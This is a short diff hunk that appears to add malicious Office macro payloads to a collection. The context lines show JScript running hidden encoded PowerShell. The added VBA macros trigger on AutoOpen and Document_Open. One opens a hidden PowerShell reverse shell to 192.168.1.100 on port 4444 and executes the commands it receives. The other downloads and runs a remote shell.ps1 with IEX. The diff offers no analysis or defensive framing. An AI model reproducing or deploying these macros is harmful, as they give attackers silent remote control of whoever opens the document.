@@ -46,3 +46,37 @@ End Sub
     var shell = new ActiveXObject("WScript.Shell");
     shell.Run("powershell -NoP -NonI -W Hidden -Enc <payload>");
 </script>
+
+
+
+Sub AutoOpen()
+    Call ReverseShell
+End Sub
+
+Sub Document_Open()
+    Call ReverseShell
+End Sub
+
+Sub ReverseShell()
+    Dim cmd As String
+    cmd = "powershell -nop -w hidden -c ""$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100', 4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()};$client.Close()"""
+    CreateObject("WScript.Shell").Run cmd, 0, False
+End Sub
+
+
+
+
+
+Sub AutoOpen()
+    Call InvokeShell
+End Sub
+
+Sub Document_Open()
+    Call InvokeShell
+End Sub
+
+Sub InvokeShell()
+    Dim cmd As String
+    cmd = "powershell -version 2 -nop -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')"""
+    CreateObject("WScript.Shell").Run cmd, 0, False
+End Sub
